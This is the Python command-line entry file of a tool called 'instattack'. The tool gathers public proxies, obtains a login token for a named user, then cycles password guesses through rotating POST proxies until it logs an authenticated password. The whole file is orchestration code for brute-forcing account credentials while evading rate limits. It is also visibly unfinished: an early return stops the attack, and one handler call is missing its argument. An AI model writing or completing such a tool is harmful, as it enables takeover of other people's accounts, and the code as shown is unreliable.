#!/usr/bin/env python3
from platform import python_version
import logging
import signal
import sys
import traceback

import asyncio
from plumbum import cli, local

from instattack import exceptions
from instattack.conf import settings
from instattack.conf.utils import validate_log_level, validate_method

from instattack.logger import AppLogger, log_handling, handle_global_exception

from instattack.users.models import User
from instattack.proxies.utils import read_proxies, write_proxies

from instattack.utils import cancel_remaining_tasks, bar

from instattack.handlers import (
    ProxyHandler, TokenHandler, ResultsHandler, PasswordHandler)

from .args import ProxyArgs, AttackArgs

"""
Plumbum Modules That We Should Implement

Plumbum Docs
https://plumbum.readthedocs.io/en/latest/quickref.html

PROGNAME = Custom program name and/or color
VERSION = Custom version
DESCRIPTION = Custom description (or use docstring)
COLOR_GROUPS = Colors of groups (dictionary)
COLOR_USAGE = Custom color for usage statement

Plumbum Progress Bar
Plumbum Colors

Plumbum User Input
plumbum.cli.terminal.readline()
plumbum.cli.terminal.ask()
plumbum.cli.terminal.choose()
plumbum.cli.terminal.prompt()

.cleanup()
Method performed in cli.Application after all components of main() have completed.
"""


# May want to catch other signals too - these are not currently being
# used, but could probably be expanded upon.
SIGNALS = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)

logging.getLogger("proxybroker").setLevel(logging.CRITICAL)

log = AppLogger(__file__)


class BaseApplication(cli.Application):

    level = cli.SwitchAttr("--level", validate_log_level, default='INFO')


class Instattack(BaseApplication):

    def validate(self, *args):
        if int(python_version()[0]) < 3:
            log.error('Please use Python 3')
            sys.exit()
        if args:
            log.error("Unknown command %r" % (args[0]))
            sys.exit()
        # The nested command will be`None if no sub-command follows
        if not self.nested_command:
            log.error("No command given")
            sys.exit()

    @log_handling('self')
    def main(self, *args):
        log.warning('Reminder: Look into plumbum colors instead of colorama')
        self.validate(*args)


@Instattack.subcommand('proxies')
class ProxyApplication(BaseApplication, ProxyArgs):

    _method = 'GET'
    _current_proxies = None
    _progress = None

    limit = cli.SwitchAttr("--limit", int, default=10)

    @property
    def progress(self):
        if not self._progress:
            self._progress = bar(label='Collecting Proxies', max_value=self.limit)
        return self._progress

    @cli.switch("--method", cli.Set("GET", "POST", case_sensitive=False))
    def method(self, method):
        self._method = method.upper()

    def display_proxy(self, proxy):
        log.notice('Proxy, Error Rate: %s, Avg Resp Time: %s' % (
            proxy.error_rate, proxy.avg_resp_time
        ))

    def collect(self):
        loop = asyncio.get_event_loop()

        proxy_handler = ProxyHandler(method=self._method)

        loop.run_until_complete(asyncio.gather(
            self.collect_proxies_from_pool(loop, proxy_handler),
            proxy_handler.server.find()
        ))

    async def collect_proxies_from_pool(self, loop, proxy_handler):
        """
        This needs to work for the collect case, where we only want unique
        proxies (as long as --clear is not set) and the test case, where we
        do not care if they are unique.
        """
        self.progress.start()
        while len(self.collected) < self.limit:
            try:
                # TODO: We can just provide these arguments to the ProxyPool (or
                # probably the find() method, or the Broker possibly.)
                proxy = await proxy_handler.get_from_pool(
                    max_error_rate=self.max_error_rate,
                    max_resp_time=self.max_resp_time,
                )
            # Weird error from ProxyBroker that makes no sense...
            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
            except TypeError as e:
                log.warning(e)
            else:
                await self.handle_found_proxy(proxy)

        self.progress.finish()
        await proxy_handler.stop()


@ProxyApplication.subcommand('test')
class ProxyTest(ProxyApplication):

    _current_proxies = []


@ProxyApplication.subcommand('collect')
class ProxyCollect(ProxyApplication):

    # If show is set, the proxies will just be displayed, not saved.  Otherwise,
    # they get shown and saved.
    show = cli.Flag("--show")

    # Only applicable if --show is False (i.e. we are saving).
    clear = cli.Flag("--clear")

    @log_handling('self')
    def main(self):
        self.collected = []
        self.collect()
        if not self.show:
            self.save()

    @property
    def current_proxies(self):
        if self._current_proxies is None:
            if self.clear:
                self._current_proxies = []
            else:
                self._current_proxies = read_proxies(method=self._method)
                log.notice(f'Currently {len(self._current_proxies)} Proxies Saved.')
        return self._current_proxies

    async def handle_found_proxy(self, proxy):
        if proxy not in self.current_proxies:
            self.display_proxy(proxy)
            self.collected.append(proxy)
            self.progress.update()
        else:
            log.warning('Discarding Proxy - Already Saved', extra={'proxy': proxy})

    def save(self):
        log.notice(f'Saving {len(self.collected)} Proxies to {self._method.lower()}.txt.')
        write_proxies(self._method, self.collected, overwrite=self.clear)


@Instattack.subcommand('attack')
class InstattackAttack(BaseApplication, AttackArgs):

    def get_handlers(self):
        proxy_handler = ProxyHandler(method='GET', **self.token_conf)
        token_handler = TokenHandler(
            proxy_handler,
            **self.token_conf,
        )
        return proxy_handler, token_handler

    def post_handlers(self, user):
        proxy_handler = ProxyHandler(method='POST', **self.password_conf)
        password_handler = PasswordHandler(
            self.user,
            proxy_handler,
            **self.password_conf,
        )
        return proxy_handler, password_handler

    @log_handling('self')
    def main(self, username):
        self.user = User(username)
        self.user.setup()

        print(self.pw_conf)
        return
        loop = asyncio.get_event_loop()
        try:
            self.attack(loop)

        # This would likely be exceptions from the proxybroker package since
        # our other exceptions are handled in main().
        except Exception as e:
            exc_info = sys.exc_info()
            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
            handle_global_exception(e)

        finally:
            loop.run_until_complete(self.shutdown(loop))
            loop.close()

    def attack(self, loop):

        results = asyncio.Queue()
        results_handler = ResultsHandler(self.user, results)

        get_proxy_handler, token_handler = self.get_handlers()
        try:
            loop.run_until_complete(get_proxy_handler.prepopulate(loop))

            task_results = loop.run_until_complete(asyncio.gather(
                token_handler.consume(loop),

                # I don't think this is working with the broker...
                # We should test this without prepopulating to see if we
                # are actually getting proxies coming through...
                get_proxy_handler.produce(loop),

                # I don't think this is finding proxies, but the above producer
                # is working because of the prepopulated.
                get_proxy_handler.server.find(),
            ))

        except Exception as e:
            exc_info = sys.exc_info()
            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
            handle_global_exception(e)

            # Might not have been stopped if we hit an exception.
            self.ensure_servers_shutdown(loop, get_proxy_handler)

        else:
            # Get Proxy Server Stopped Automatically
            token = task_results[0]
            if not token:
                raise exceptions.FatalException("Token should not be null.")
            log.notice('Received Token', extra={'token': token})

            post_proxy_handler, password_handler = self.post_handlers()
            try:
                loop.run_until_complete(asyncio.gather(
                    password_handler.prepopulate(loop, password_limit=self.password_limit),
                    post_proxy_handler.prepopulate(loop)
                ))

            except Exception as e:
                exc_info = sys.exc_info()
                e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
                handle_global_exception(e)

            else:
                auth_result_found = asyncio.Event()

                try:
                    task_results = loop.run_until_complete(asyncio.gather(
                        results_handler.consume(loop, auth_result_found),
                        password_handler.consume(loop, auth_result_found, token, results),

                        # I don't think this is working with the broker...
                        # We should test this without prepopulating to see if we
                        # are actually getting proxies coming through...
                        post_proxy_handler.produce(loop),

                        # I don't think this is finding proxies, but the above producer
                        # is working because of the prepopulated.
                        post_proxy_handler.server.find(),
                    ))

                except Exception as e:
                    exc_info = sys.exc_info()
                    e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
                    handle_global_exception(e)

                    # Might not have been stopped if we hit an exception, but should
                    # be stopped automatically if the block succeeds.  We will
                    # leave this for now to make sure.
                    self.ensure_servers_shutdown(loop, post_proxy_handler)
                    loop.run_until_complete(results_handler.dump(loop))

                else:
                    # Post Proxy Server Stopped Automatically
                    result = task_results[0]
                    if result:
                        log.notice(f'Authenticated User!', extra={
                            'password': result.context.password
                        })

                finally:
                    # Might not have been stopped if we hit an exception, but should
                    # be stopped automatically if the block succeeds.  We will
                    # leave this for now to make sure.
                    self.ensure_servers_shutdown(loop, get_proxy_handler, post_proxy_handler)
                    loop.run_until_complete(results_handler.dump(loop))

    def ensure_servers_shutdown(self, loop, *handlers):
        """
        We have to run handler.server.stop() and handler.server.find()
        directly from loop.run_until_complete() instead of using the
        async methods start_server() and stop_server() - don't know why
        but that is why we cannot restrict to handler._server_running.
        """
        for handler in handlers:
            # if handler._server_running:
            log.warning(f'{handler.method} Proxy Server Never Stopped.')
            handler.server.stop()

    async def shutdown(self, loop, signal=None):

        if signal:
            log.warning(f'Received exit signal {signal.name}...')

        with log.start_and_done('Shutting Down'):
            with log.start_and_done('Cancelling Tasks'):
                await cancel_remaining_tasks()

            loop.stop()


def main():
    Instattack.run()


if __name__ == '__main__':
    main()
